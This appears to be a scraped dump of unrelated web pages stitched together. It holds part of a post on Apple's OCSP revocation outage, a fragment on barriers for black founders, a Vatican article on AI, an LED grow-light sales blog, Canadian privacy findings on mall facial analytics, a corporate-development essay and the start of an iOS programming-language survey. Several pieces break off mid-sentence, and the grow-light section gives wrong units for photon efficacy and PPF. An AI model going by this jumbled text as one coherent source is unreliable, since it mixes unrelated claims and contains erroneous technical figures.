<p><img src="https://blog.cryptohack.org/assets/images/apple-failed-verify.png?style=centerme" alt="Apple failed to verify popup"></p>

<h3 id="revocation">Revocation</h3>

<p>What happens when a developer is found to be breaching Apple’s rules, or loses control of their private key? A certificate authority needs to be able to instantly nullify bad certificates they’ve issued. If a certificate is being used maliciously, it’s not acceptable to wait days or months until it expires naturally, otherwise a leak of a high-profile private key would render the whole system useless.</p>

<p>This is where certificate revocation comes in. It’s an additional step in the signature verification process, which involves finding out from the certificate authority if a certificate is still valid.</p>

<p>Originally, at least on the web, this was done the simplest way you can imagine. The certificate authority would give you a Certificate Revocation List (CRL), containing serial numbers of all revoked certificates, and you could check the certificate you are currently verifying is not on the list. However, this approach stopped being used by web browsers since the list got longer and longer and failed to scale. Especially after terrifying exploits like <a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed</a> demanded mass revocation of certificates.</p>

<p>Online Certificate Status Protocol (OCSP) is an alternative allowing real-time checking of certificates. Each certificate can include a baked-in “OCSP Responder”, a URL that you can query that will report whether the certificate has been revoked. In Apple’s case, that’s “ocsp.apple.com”. So now, in addition to verifying the cryptographic validity of the signature, each time you launch an app you’re performing a real-time check with Apple (subject to some caching) to ensure they still think the developer’s ID certificate is legitimate.</p>

<h3 id="ocsps-availability-problem">OCSP’s Availability Problem</h3>

<p>There’s a huge problem with OCSP: it makes an external service a single point of failure. What happens if the OCSP Responder is down or unreachable? Do we just refuse to verify the certificate (hard-fail)? Or do we pretend that the check was successful (soft-fail)?</p>

<p>Apple are forced to use the soft-fail behaviour, otherwise apps wouldn’t work when you’re offline. As it happens, all major browsers also implement the soft-fail behaviour, since OCSP Responders have traditionally been unreliable, and browsers want to keep displaying websites even if certificate authorities’ responders are temporarily down.</p>

<p>But soft-fail isn’t great, because it means that an attacker with network control can block requests to the responder, and the revocation check will be skipped. In fact, that was the hotfix widely shared on Twitter during this incident: blackhole traffic to “ocsp.apple.com” by adding a line to <em>/etc/hosts</em>. A lot of people won’t be removing that line anytime soon, since disabling OCSP doesn’t cause any noticeable problems.</p>

<h3 id="the-incident">The Incident</h3>

<p>If Apple’s OCSP check was built to soft-fail, then why did apps hang when the OCSP Responder was down? Probably because this was actually a different failure case: the OCSP Responder was not completely down, it was performing badly.</p>

<p>Due to the load added by millions of users worldwide upgrading to macOS “Big Sur”, Apple’s servers slowed to a crawl, and although they weren’t properly answering OCSP queries, they were working just enough that the soft-fail didn’t trigger.</p>

<h3 id="ocsps-privacy-problem">OCSP’s Privacy Problem</h3>

<p>In addition to OCSP’s availability problems, the protocol wasn’t initially designed with privacy in mind. A basic OCSP query involves an unencrypted HTTP request to the OCSP Responder with the serial number of the certificate. Therefore not only can the responder figure out what certificate you are interested in, but so can your ISP and anybody else intercepting packets. Apple could use this to build a timeline of which developers’ apps you are opening, as could third parties.</p>

<p><img src="https://blog.cryptohack.org/assets/images/apple-ocsp-wireshark.jpg?style=centerme" alt="OCSP packet in wireshark"></p>

<p>Adding encryption is possible, and there’s a better, more private version called <a href="https://en.wikipedia.org/wiki/OCSP_stapling">OCSP stapling</a>, but Apple is not using either of these things. In fact OSCP stapling wouldn’t make sense in this scenario, but it illustrates how OCSP needs improvements to not leak data by default.</p>

<h3 id="a-better-future">A Better Future</h3>

<p>This incident has started a lively debate in the software community, with one side proclaiming <a href="https://sneak.berlin/20201112/your-computer-isnt-yours/">“Your Computer Isn’t Yours”</a> and the other arguing that <a href="https://www.security-embedded.com/blog/2020/11/14/application-trust-is-hard-but-apple-does-it-well">“application trust is hard but Apple does it well”</a>. This post aims to show that whichever side you agree with, OCSP is a terrible way to manage certificate revocation, and will lead to more availability and privacy incidents in future. In my opinion, it was a poor engineering decision for Apple to make app launching dependent on OCSP. In the short term at least they have mitigated the damage by <a href="https://lapcatsoftware.com/articles/ocsp.html">increasing the time that responses are cached</a>.</p>

<p>Fortunately, a better revocation method is reaching maturity. CRLite is a way to shrink down lists of all revoked certificates to a reasonable size. <a href="https://scotthelme.co.uk/crlite-finally-a-fix-for-broken-revocation/">Scott Helme’s blog</a> gives a good summary of how CRLite uses Bloom Filters to make the Certificate Revocation List approach – which OCSP superseded – feasible again.</p>

<p>Theoretically, macOS devices could pull updates to this list periodically and do certificate revocation checking on the device itself, addressing the availability and privacy problems with OCSP. On the other hand, since the list of revoked Developer ID certificates is much smaller than the list of all revoked PKI certificates, it’s worth asking why Apple haven’t opted to use CRLs in the first place. Perhaps they don’t want to reveal any information about which certificates they’ve revoked.</p>

<h3 id="conclusion">Conclusion</h3>

<p>Overall, the incident this week was a good time to reflect on the trust model that has been promoted by organisations like Apple and Microsoft. Malware has grown in sophistication and most people aren’t in a position to judge whether it’s safe to run particular binaries. Code signing seems like a neat way to leverage cryptography to determine whether or not to trust applications, and to at least associate apps with known developers. And revocation is a necessary part of maintaining that trust.</p>

<p>However, by adding several mundane failure modes to the verification process, OCSP spoils any cryptographic elegance the code signing and verifying process has. While OCSP is also widely used for TLS certificates on the internet, the large number of PKI certificate authorities and relaxed attitude of browsers means that failures are less catastrophic. Moreover, people are accustomed to seeing websites become unavailable from time to time, but they don’t expect the same from apps on their own devices. macOS users were alarmed at how their apps could become collateral damage for an infrastructure issue at Apple. Yet this was an inevitable outcome arising from the fact that certificate verification depends on external infrastructure, and no infrastructure is 100% reliable.</p>

<p>Scott Helme also has concerns about the power that Certificate Authorities gain when certification revocation actually works effectively. Even if you aren’t bothered about the potential for censorship, there will be occasional mistakes and these must be weighed against the security benefits. As one developer discovered when <a href="https://blog.charliemonroe.net/a-day-without-business/">Apple mistakenly revoked his certificate</a>, …</p></div></article></div></div></div>

Professional investors “pattern match” and since there are not many successful black founders, the problem is accentuated. A prominent Silicon Valley investor has said he mostly invests in twenty-something white males with no social life because that has been his formula for success.</p></li></ul><ul><li id="viewer-94jh"><p><strong>Home Equity Funding</strong>: She likely will not have a house or enough home equity, from which to take out a loan. Her lower income and the worse mortgage rates for blacks almost guarantees this.</p></li></ul><ul><li id="viewer-aaiij"><p><strong>Clients &amp; Customers</strong>: Despite their talents and perfect scores, the Tuskegee Airmen had to prove themselves over and over again before being allowed to serve their nation. The situation is similar for black-owned businesses when seeking clients and customers. Robert Smith (the billionaire founder of Vista Equity Partners) recounts how he still experienced racism despite stellar returns in his first fund, and a dual Ivy League education. The typical black founder has neither.</p></li></ul><ul><li id="viewer-6tk32"><p><strong>Talent:</strong> Limited funding means she will struggle to attract talent—and discerning talent will not want to work for a business with low odds of success.</p></li></ul><ul><li id="viewer-eumc8"><p> <strong>“Insider Knowledge”:</strong> Lack of contacts in the right circles to share industry-specific “insider knowledge” often required for success.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>In his video message on his prayer intention for November, Pope Francis emphasizes that progress in robotics and artificial intelligence (AI) be oriented “towards respecting the dignity of the person and of Creation”.</p><div itemprop="articleBody">
            <p><b><i>By Vatican News staff writer</i></b></p> 
<p>During the month of November, Pope Francis draws our attention to the epochal change that humanity is experiencing thanks to advances in artificial intelligence. &nbsp;He, therefore, invites us to pray that this progress always “serve humankind,” respecting human dignity and taking care of Creation.</p> 
<h2><b>True progress</b></h2> 
<p>Artificial Intelligence (AI) has made exponential advances, as evidenced by its many applications in different fields of knowledge. Today, 37% of organizations in the world have implemented AI in some way (which represents a 270% increase in the past four years).</p> 
<p>In “<a href="https://thepopevideo.org/" rel="external nofollow" target="_blank">The Pope Video</a>” this month, Pope Francis clarifies that this progress in robotics and AI “can make a better world possible if it is joined to the common good.” &nbsp;In this sense, he hopes for technological progress that does not increase the inequalities in society.&nbsp; If it does, the Pope says, it will not be “true progress”.&nbsp; Such progress does not take into account the dignity of the human person and care for Creation.</p> 
<h2><b>Benefits</b></h2> 
<p>AI is capable of addressing many problems facing humanity, such as in evaluating the learning capacity of students, in order to detect opportunities for improvement.&nbsp; It can help people with visual or hearing impairments by developing better communication tools (such as converting text to speech or speech to text).&nbsp; AI can also speed up the collection, processing and diffusion of health data to improve the diagnosis and treatment of patients, especially those living in remote areas.</p> 
<p>The same applies to the field of ecology. Through AI, it is possible to analyze data on climate change and create models that can help predict natural disasters. It can also be used to create intelligent and sustainable cities by reducing urban spending, improving the resilience of highways and increasing energy efficiency.&nbsp; There are vast possibilities for using this technological progress for the common good, and “The Pope Video” uses images from the Italian Institute of Technology and the Italian multinational energy company, Enel, to show some of these benefits.</p> 
<h2><b>Serving humanity&nbsp;</b></h2> 
<p>“Innovation,” says Enel’s CEO, Francesco Starace, “has placed at our disposition extraordinary tools that we need to be capable of using in the best possible way.”&nbsp;</p> 
<p>He continues, “As Pope Francis reaffirms, it is our task to ensure that the resulting benefits are distributed fairly and create opportunities and wellbeing.” Starace says, “In order to give a positive orientation to our actions and choices regarding the present and the future, we must put respect for people and for the environment at the centre, adopting a vision based on sustainability. Only in this way can technological evolution be an ally of humanity and create opportunities which, up until a few years ago, we couldn’t even imagine.”</p> 
<p>The Pope’s <a href="https://www.popesprayer.va/" rel="external">Worldwide Prayer Network</a> is responsible for the diffusion of the Pope’s monthly prayer intentions. &nbsp;In comments on the Holy Father’s prayer intention for November, the network’s international director, Jesuit Father Frédéric Fornos also speaks of the need to channel these rapid technological changes for the “good of all.”</p> 
<p>“This month’s prayer intention,” he says, “reinforces the idea that the benefit that humanity has obtained (and will continue to obtain) from technological progress must always take into account as well, and in parallel, ‘adequate development of responsibility and values’.”&nbsp; This, Fr Fornos says, has been underscored by the Pope in his encyclical <i>Laudato si’ </i>and now in his third encyclical, <i>Fratelli tutti,</i> where he says, “How wonderful it would be if the growth of scientific and technological innovation could come with more equality and social inclusion!”</p> 
<p>AI, robotics, and other applications of technology, says Fr Fornos, open great challenges for ethics and social justice. “This is why the Pope’s most recent petition is important: to pray that this progress will always ‘be human.’”</p> 
<p><b>The text of the November 2020 prayer intention:</b></p> 
<p><i>Artificial intelligence is at the heart of the epochal change we are experiencing.&nbsp; Robotics can make a better world possible if it is joined to the common good.&nbsp; Indeed, if technological progress increases inequalities, it is not true progress.&nbsp; Future advances should be oriented towards respecting the dignity of the person and of Creation.&nbsp;</i></p> 
<p><i>Let us pray that the progress of robotics and artificial intelligence may always serve humankind… we could say, may it “be human.”</i><br> </p></div></div>]]>

November 15, 2020 | https://medicgrow.com/blogs/news/how-to-pick-a-best-led-grow-light | <a href="https://web.archive.org/web/*/https://medicgrow.com/blogs/news/how-to-pick-a-best-led-grow-light">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      <div><p>If you're a lover of indoor gardening and still a newbie who don't understand how indoor gardening works, you first need to find different materials to learn from, right?</p><p>Well, during this learning process, you'll discover that indoor growth requires one piece of very essential equipment: <a href="http://www.medicgrow.com/" target="_blank" title="Medic grow led grow light" rel="noopener noreferrer">LED grow light</a>. Since these plants are grown in-house, they need a LED grow light that can mimic sunlight and drive photosynthesis.</p><p>You will see that many lights call themselves "best grow light," but there are actually four main types of these lights: Fluorescent grow lights, MH, HPS Bulbs, and LED lights.</p><p>If you read the <a href="https://en.wikipedia.org/wiki/Grow_light" target="_blank" title="wikipedia grow light article" rel="noopener noreferrer">Wikipedia article about grow lights</a>, you'll find that LED&nbsp;lighting are by far the best ones. Needless to say, the first few traditional lamps have their own advantages; for example, they are cheap and can be bought just about anywhere. But their shortcomings are also obvious, like they emit too much heat, or the spectrum does not meet the needs of plants etc.</p><p>For some plants that require a lot of light to grow, those traditional lights&nbsp;can not compete with&nbsp;LED ones in some respects. In this blog we will list some basic knowledge on choosing a&nbsp;perfect&nbsp;LED plant-growth lighting.</p></div>
<h2>8&nbsp;Key Features&nbsp;You Should Know About&nbsp;LED Grow Lights</h2>
<h3><strong>1. PAR</strong></h3>
<p>PAR stands for "photosynthetic active radiation". <span>&nbsp;</span><span>It</span><span>&nbsp;is a metric used for plants while lumens are for humans.&nbsp; So plants don't care how bright your light fixture appears to you.&nbsp;PAR in lighting is the wavelength within the visible range of 400 to 700 nanometers (nm), and plants use this range to&nbsp;photosynthesise or grow.&nbsp;</span></p>
<p><span><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/par-measurement.jpg?v=1605057977" alt="LED grow light PAR"></span></p>
<h3>
<br><strong>2. PPF&amp;PPFD</strong>
</h3>
<div><p>There are two phases related to photosynthetically active radiation (PAR). These are photosynthetic photon flux (PPF) and photosynthetic photon flux density (PPFD).</p><p>PPF simply describes the number of photons that led grow lamp produces in the PAR wavelength range within one second.</p></div>
<div><p>PPF is measured in units called micromoles (umol). You can use PPF to determine whether your grow light is "powerful enough" for your plants.</p><p>PPFD is the number of photons that hit the plant canopy in a given second. This is measured in micromoles (umols). The bigger of this value, the better.</p><p>The difference between PPF and PPFD is that PPF is the intensity of light when measured at the light source, while PPFD is the light intensity when measured at the surface of the plant.</p></div>

<p><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/ppf_and_ppfd_600x600.jpg?v=1605063210" alt="LED grow light PPF and PPFD"></p>
<h3>
<p><strong>3. Photon Efficacy</strong></p></h3>
<p>Photon efficacy is the measure of how well a light source produces visible light. The unit for efficacy is Joule per second (J/s). If you know the PPF and the input wattage of a light, you can easily calculate photon efficacy. The higher this number is, the more efficient a grow light is at converting electricity into photons. So be sure to check this out with a lighting manufacturer.</p>
<h3>
<br><strong>4. LED Chips</strong>
</h3>
<p><br>Chips are the most necessary and basic aspect of an LED grow lighting. Therefore, the manufacturing of chips must keep durability and efficiency in mind.</p>
<p><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/products/IMG_20201023_152418_600x600.jpg?v=1604388543" alt="led chip"></p>
<div><p>The suitable LED chip will hardly show color inconsistency while maintaining voltage and intensity. A carefully crafted chip can produce effective and uniform LED lights that can support a variety of crops.</p><p>There are many LED chip brands you can pick from, such as Bridgelux, Philips, Epistar, CREE, or Osram. Among these, CREE and Osram are favored by many users due to their chip's durability and efficiency.</p></div>
<h3>
<br><strong>5. Spectrum</strong>
</h3>
<p>The spectrum refers to the electromagnetic wavelength of light generated by the light source to promote plant growth. In order to perform photosynthesis, plants use light in the PAR (photosynthesis active radiation) region, and the wavelength of this region (400nm-700nm) is measured in nanometers (nm).</p>
<div><p><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/spectrum_600x600.jpg?v=1605063737" alt="LED grow light full spectrum"></p><p>The LED lighting stimulates the colors of the sunlight range from red and yellow to blue and violet, and plants use this full spectrum to undergo the process of photosynthesis.</p><p>The red and blue lights are the most critical for plants. Blue is for the vegetative stage while red is for blooming.</p></div>
<p>Other wavelengths besides red and blue are also beneficial for certain phases of plant growth.</p>
<p>Ultraviolet helps protect the plants from insects and diseases, and a bit more infrared light than normal makes your plants think they are covered by something so they need to grow taller to get more light.</p>
<div><p>Green light can penetrate farther into plants leaves and farther below the canopy than other wavelengths.</p><p>The ideal spectrum can help accelerate vegetation, increase flowering, speed up growth, etc. Whether or not the light source is supplementary (as with a <a href="https://en.wikipedia.org/wiki/Greenhouse" target="_blank" title="greenhouse" rel="noopener noreferrer">greenhouse</a>) or the sole one will also affect which light spectrum should be used.</p><p>Therefore, getting an LED grow light with a full spectrum for your indoor plants means that it provides all the wavelengths present in natural light. All you need to do is switch the amount of light exposure the plants need during the different growth phases.</p></div>

<h3><strong>6. Heat Dissipation</strong></h3>
<p>Although LEDs emit less heat than other traditional grow lights, putting many LEDs together, they still need a heat dispassion system to keep the body cool at all times. Some best LED lights on the market have a heat sink to release extra heat. That means no noisy fans, and no wasted electricity by powering them.</p>
<h3>
<img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/Heat_Dissipation_600x600.jpg?v=1605065892" alt="LED grow light heat dissipation"><p><strong>7. Lighting Coverage</strong></p></h3>
<p>Each LED grow light you consider should have information regarding the lighting coverage. This refers to the coverage area, which is usually measured in square footage, of the light that falls onto the plants.</p>
<p>A good coverage area is essential, not only do the size and lenses of your LED grow light determine your coverage area, but so does hanging height. The further the distance between your lights and plants, the greater the footprint, but the lower the PPFD.</p>
<p><img src="https://cdn.shopifycdn.net/s/files/1/0278/2330/8909/files/led_grow_light_coverage_2_600x600.jpg?v=1605081160" alt="LED grow light coverage"></p>
<p>Let's say you have a lamp hanging at a 12-foot distance from your canopy. Then, you increase the hanging height to a distance of 24 feet. You will now have a light intensity that is&nbsp;much less of what it was before.&nbsp;</p>
<p>This is why it's very important to pay attention to hanging height and coverage area when selecting an LED light.</p>

<h3><strong>8. Wattage</strong></h3>
<p>When it comes to LED grow-light wattage, this metric refers to two things. A 550w LED light can either indicate that it can truly pull 550w energy from the wall or it can deliver an equivalent power in brightness to a 550wMH/HID grow light.</p>
<p>So pay attention to exactly what is meant by an LED grow light's stated wattage. Our<a href="https://medicgrow.com/products/medic-grow-fold-8-led-grow-light" target="_blank" title="fold 8 led grow light" rel="noopener noreferrer"> LED grow light</a> can actually deliver what it says online.</p>
<h2>
<br>Conclusion</h2>
<div><p>If you're on a tight budget, you will need to pay attention to 1, 2, and 3. But if you have extra cash to spend, you can choose the best metric from 1 to 8. For indoor plants, artificial lighting is crucial as they have no access to natural sunlight.</p><p>Good lighting is an important factor that determines the yield of your plants as well as other factors, such as the strains you use and your planting experience etc.</p></div>
<p>If you focus on the above factors when picking an LED grow light, you can definitely get the best LED grow light for your plants. A suitable LED grow light will get the most bang for your buck when it comes to minimizing electrical costs while maximizing plant health.</p>

<p><strong>October 28, 2020</strong></p>
<hr>
<h2 id="toc1">Overview</h2>
<p>The Office of the Privacy Commissioner of Canada (<abbr>OPC</abbr>), Office of the Information and Privacy Commissioner of Alberta (<abbr>OIPC AB</abbr>) and the Office of the Information and Privacy Commissioner for British Columbia (<abbr>OIPC BC</abbr>), collectively referred to as “the Offices” commenced a joint investigation<sup id="fn1-rf"><a href="#fn1"><span>Footnote </span>1</a></sup>,<sup id="fn2-rf"><a href="#fn2"><span>Footnote </span>2</a></sup> to examine whether The Cadillac Fairview Corporation Limited (<abbr>CFCL</abbr>) was collecting and using personal information of visitors to its Canadian malls, without valid consent, via:</p>
<ol>
<li><!-- i. -->Anonymous Video Analytics (<abbr>AVA</abbr>) technology installed in “wayfinding” directories; and</li>
<li><!-- ii. -->mobile device geolocation tracking technologies.</li>
</ol>
<p>Our findings in respect of these two issues are detailed below.</p>
<p><strong><abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> collected and used personal information, including sensitive biometric information, via the <abbr title="Anonymous Video Analytics">AVA</abbr> technology without valid consent.</strong></p>
<p>The <abbr title="Anonymous Video Analytics">AVA</abbr> technology: (i) took temporary digital images of the faces of any individual within the field of view of the camera in the directory (retained in computer memory briefly during processing); (ii) used facial recognition software to convert those images into biometric numerical representations of the individual faces (sensitive personal information that could be used to identify individuals based on their unique facial features); and (iii) used that information to assess age range and gender.</p>
<p><abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> represented that the numerical representations were not retained beyond processing. However, our investigation revealed that <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr>’s <abbr title="Anonymous Video Analytics">AVA</abbr> service provider had collected and stored approximately 5 million numerical representations of faces on <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr>’s behalf, on a decommissioned server, for no apparent purpose and with no justification.</p>
<p><abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> explained that it collected information via <abbr title="Anonymous Video Analytics">AVA</abbr> for purposes of monitoring foot traffic patterns and predicting demographic information about mall visitors. We found no evidence that <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> had used the biometric information, including any of the retained numerical representations, for identification purposes.</p>
<p><abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> also retained approximately 16 hours of video recordings, some including audio, which it had captured during a calibration (or testing) phase of the technology at two malls.</p>
<p><abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> asserted that to the extent that it required consent, such consent was obtained via its privacy policy. We found that this was inadequate. Firstly, an individual would not, while using a mall directory, reasonably expect their image to be captured and used to create a biometric representation of their face, which is sensitive personal information, or for that biometric information to be used to guess their approximate age and gender. As such, <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> should have obtained express opt-in consent. Further, we reviewed <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr>’s privacy policy and determined that the language was overly broad, and buried in the middle of a 5,000 word document, which would not be easily accessible to individuals while they are engaging with a mall directory. We found that the privacy policy language was not sufficient to support meaningful consent for <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr>’s <abbr title="Anonymous Video Analytics">AVA</abbr> practices.</p>
<p>Finally, we noted that while shoppers were directed, by stickers displayed at mall entrances, to visit guest services to obtain a copy of <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr>’s privacy policy, when we asked a guest services employee at one of <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr>’s malls for that policy, they were confused by the request.</p>
<p>As a result of these findings, we made several recommendations. We recommended that <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> either: (i) obtain meaningful express opt-in consent and allow individuals to use its mall directories without having to submit to the collection and use of their sensitive biometric information; or (ii) cease use of its <abbr title="Anonymous Video Analytics">AVA</abbr> technology. While <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> expressly disagreed with our findings, it advised that it had ceased use of the technology in July 2018, and that it had no current plans to resume that use. <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> has also, pursuant to further recommendations by our Offices, deleted the numerical representations of faces and audio/video recordings in its possession which were not required for legal purposes. It has confirmed that what information has been retained will not be used for any other purposes outside of those required for compliance with the law. <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> also provided privacy-related training to guest services employees. As a result, we found the matter to be <strong>well-founded and resolved</strong>.</p>
<p>Our Offices asked <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> to provide a commitment to follow our recommendations with respect to ensuring valid consent if they were to resume use of <abbr title="Anonymous Video Analytics">AVA</abbr> technology in the future. <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> indicated that if it did resume use of the <abbr title="Anonymous Video Analytics">AVA</abbr> technology, it would obtain adequate consent, “in accordance with the applicable privacy legislation and consistent with the <em>Guidelines for obtaining meaningful consent</em>”. However, it refused to commit to obtaining <strong>express opt-in</strong> consent consistent with our recommendations. We find this concerning given that <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> disagreed with our analysis and interpretation of the law in this case. For example, <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> continues to maintain, contrary to our findings, that they were not collecting personal information via the <abbr title="Anonymous Video Analytics">AVA</abbr> technology.</p>
<p><strong><abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> <em>did not</em> collect the location information of identifiable individuals via mobile device tracking technology in its malls, such that it did not require consent for the practice.</strong></p>
<p>We found that the information collected from mobile devices of shoppers, who were not logged into Wi-Fi in <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> malls, did not constitute personal information. More specifically, the hashed and randomized <abbr title="Media Access Control">MAC</abbr> address (device identifier), coupled with non-granular “zone” geolocation information collected using Wi-Fi triangulation, did not constitute personal information in this context, as there was not a serious possibility that this information could be linked, either alone or with other available information, with the mobile device holder.</p>
<p>With respect to individuals who log in to <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr>’s free Wi-Fi service, via a process that required them to provide personal information, we originally understood, based on the evidence gathered during our investigation, including from <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> and its Wi-Fi service provider, that <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> was collecting triangulated device geolocation information and linking it with identifiable device users’ Wi-Fi accounts. We therefore made certain preliminary recommendations to <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> with respect to the consent we would expect for this practice. However, in response to a preliminary report issued by our Offices, <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> clarified, and its third-party Wi-Fi service provider verified, that the geolocation information described above could not in any practical manner be associated with, or linked to, logged-in Wi-Fi accounts, such that it was not personal information in that context. We therefore determined the matter to be <strong>not well-founded</strong>.</p>
<p>We did note, however, that <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> was seeking consent for “special location-based offers”, despite the fact that it was not engaged in the practice. Further to our recommendation, <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> did remove such language from its privacy policy, and added language making clear what limited location information is collected and associated with Wi-Fi accounts (i.e., only the <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> property in question).</p>
<p>Finally, we note that <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr>’s third-party Wi-Fi service provider offers the option to associate triangulated “zone” information to accounts, and that <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> did include, in its privacy policy, the prospect of using geolocation information to deliver location-based offers. We therefore recommended that <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> commit to implementing our preliminary recommendations should it decide to activate this functionality and associate geolocation information with Wi-Fi accounts in future. Specifically, we would expect <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> to: (i) support express consent for such geolocation practices via a clear and prominent notice on the Wi-Fi log-in page; and (ii) provide a clearly explained and easily accessible opt-out option. <abbr title="Cadillac Fairview Corporation Limited">CFCL</abbr> again refused, claiming that these recommendations were speculative.</p>

<p>Corporate Development, Strategic Business Development, Corporate Business Development, or any other amalgamation – are likely all the same teams with small caveats. Traditionally, CorpDev’s mandate was to buy companies. That’s traditional. But it’s 2020 and we can all attest that business models have changed over the past years. These days CorpDev isn’t simply a team being told from the top-down what to go find and buy. More often than not it’s an assortment of functions baked into a multi-faceted team who brings the outside-in, from education to execution. This takes the form of helping business lines execute strategic partnerships, take stakes in venture investments, and yes the vanilla M&amp;A. That team could also be tasked with helping draft corporate strategy by informing business unit leaders of emerging threats given their overweighted exposure to the startup ecosystem. It’s exciting work!</p>

<p>This is why it’s disappointing to hear people say ‘don’t talk to CorpDev unless you’re ready to sell.’ (<a rel="noreferrer noopener" href="http://paulgraham.com/corpdev.html" target="_blank">Enter Paul Graham’s essay</a>) It’s short-sighted. It’s akin to having a VC reach out to a founder, ask for a conversation, and the founder says, “no thanks, we’re not currently raising.” The most likely response from the VC would be, “cool, I wasn’t looking to invest but wanted to create a connection.” </p>



<p>All of it is a relationship-driven business.  Executing partnerships, investments and acquisitions are more likely to happen if you previously knew the founders or investors in advance. And you don’t need to wait to talk to VCs or CVCs or ‘CorpDev’ until you’re ready – talk to them when you have mutual interests that could be beneficial to both parties.  Talk to them when you’re looking to network.  Don’t wait to talk to them until, and only until you’re ready to begin a raise or be sold. If you do so there’s a chance you’ll get a response like the following, “thanks for reaching out and happy to still connect, but we just did X 3 months ago and would have loved to connect back then.”&nbsp;</p>

<p>CorpDev benefits regardless if their company grows through in-organic ways. And if it’s a legit team, they’re involved regardless in everything of strategic value that’s in-organic. Outside engagement with the startup ecosystem is what that usually looks like. Even more so, transactions in my experience have happened by having existing relationships. This is the same team sitting at the leadership table adjacent to the business unit heads with a purview into the organization’s strategy – they know the players involved, and what is necessary to get something executed. If they’re good, they’ll be frank on timing and engagement strategy. For example, “our process takes 5 weeks to execute from soup to nuts, and you’ll know in the next week if X is possible.”</p>



<p>Additionally, having pre-existing relationships with CorpDev can help outside startups and companies bypass red-tape or headaches. I see this a lot: a Series A-C startup working with an individual at the firm already for the past two months, only to find out that that person who’s ‘in’ the business needs to go through procurement which includes an RFP process to get a contract signed off on. That individual didn’t know because it was the first time they were engaged in something like that, regardless of their passionate intentions. What the startup’s sales executive thought would be signing of the account in a quarter quickly turned into a 12-18 month procurement process that they now have the chance of losing. This usually comes to fruition as pen needs to be signed to paper and the individual who ushered them in is not the individual who’ll be signing off on the $50,000 PoC to test validity leading to production.</p>



<p>Having a contact at the firm’s CorpDev team can always quickly hash something like the aforementioned out over a 15-minute phone call at the beginning, providing a black and white picture of what they should expect and the best way to close. CorpDev understands who’s inside the organization.  CorpDev can help ‘herd the sheep’.  And if they’re good (respected) CorpDev can influence without direct authority.</p>



<p>Talk to CorpDev.   Talk to them when you’re curious.   Talk to them when you’re about to start raising.   Talk to them when you’re kicking off direct sales, auctions, and more.   Don’t wait. </p>

November 15, 2020 | https://blog.timac.org/2020/1019-evolution-of-the-programming-languages-from-iphone-os-to-ios-14/ | <a href="https://web.archive.org/web/*/https://blog.timac.org/2020/1019-evolution-of-the-programming-languages-from-iphone-os-to-ios-14/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In my previous article about <a href="https://blog.timac.org/2020/0927-state-of-swift-ios14/">Apple’s use of Swift and SwiftUI in iOS&nbsp;14</a>, I counted the number of built-in apps in iOS using Swift and SwiftUI. Several readers asked if I could provide a percentage rather than an absolute number.</p>
<p>In this new article, I will answer this question by measuring the total number of binaries in iOS. I will go one step further and also count the number of binaries using other programming languages: Objective-C, C++ and C.</p>
<p>Finally to be as complete as possible, I ran this analysis on all major iOS releases, from iPhone&nbsp;OS&nbsp;1.0 to iOS&nbsp;14. This will provide a detailed overview of the evolution of the different programming languages over more than a decade of iOS development.</p>

<p>Before jumping into the analysis, let's clarify the scope. First I only analyzed what is commonly called ‘iOS’, i.e. everything above the kernel. The XNU kernel and low-level firmwares (SecureROM, Baseband, …) are not included in this analysis. On the other hand, I counted the frameworks located inside the dyld shared cache, a cache mechanism introduced in iPhone&nbsp;OS&nbsp;3.1 and still used in iOS&nbsp;14.</p>
<p>Another point is that you may note the absence of Objective-C++. The approach I used can't really detect binaries using Objective-C++. So I counted such binaries as using both Objective-C and C++.</p>
<p>Finally you should take this analysis with a grain of salt. While I believe the overall picture to be accurate, my approach has some limitations due to the simple fact that I don't have access to the iOS source code and relied on imprecise compilation artifacts.</p>

<p>The first problem to tackle was to count the number of binaries in iOS. Because I ran the analyses off‑device, I could not rely on the permissions being properly set.</p>
